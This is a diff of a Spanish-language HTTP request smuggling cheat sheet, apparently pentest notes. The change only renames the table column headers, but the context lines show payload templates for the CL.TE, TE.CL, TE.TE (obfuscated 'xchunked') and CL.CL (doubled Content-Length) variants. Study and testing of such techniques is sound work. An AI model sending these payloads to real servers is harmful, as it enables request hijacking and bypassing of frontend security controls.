@@ -23,7 +23,7 @@ linked:
 
 ## CL.TE (Front Content-Length, Back Transfer-Encoding)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Frontend usa `Content-Length`, backend usa `Transfer-Encoding: chunked`. | Frontend lee body completo según CL → backend interpreta primer chunk + resto como request nuevo. |
 | Setup mínimo | `POST / HTTP/1.1\r\nHost: target\r\nContent-Length: <N>\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED REQUEST` | `0\r\n\r\n` cierra chunked stream para back-end. Resto = smuggled. |
@@ -58,7 +58,7 @@ ___
 
 ## TE.CL (Front Transfer-Encoding, Back Content-Length)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Frontend usa `Transfer-Encoding: chunked`, backend usa `Content-Length`. | Inverso de CL.TE. |
 | Setup mínimo | `POST / HTTP/1.1\r\nHost: target\r\nContent-Length: <small>\r\nTransfer-Encoding: chunked\r\n\r\n<chunk-size>\r\nGPOST / HTTP/1.1\r\n...\r\n0\r\n\r\n` | Más complejo — chunk con request smuggleada adentro. |
@@ -96,7 +96,7 @@ ___
 
 ## TE.TE (Header Obfuscation)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Ambos servers usan TE pero uno solo respeta una variante ofuscada. | Misma idea que CL.TE/TE.CL pero ambos confunden TE. |
 | Obfuscation 1 | `Transfer-Encoding: xchunked` | Front rejecta, back acepta (o viceversa). |
@@ -130,7 +130,7 @@ ___
 
 ## CL.CL (Header Doubling)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Doble header `Content-Length` con valores distintos — front lee uno, back lee otro. | RFC 7230 §3.3.3 dice rejectar — pero algunos parsers laxos. |
 | Setup | `Content-Length: 12\r\nContent-Length: 17\r\n\r\nbody...` | Front lee primero (12), back lee último (17) o viceversa. |
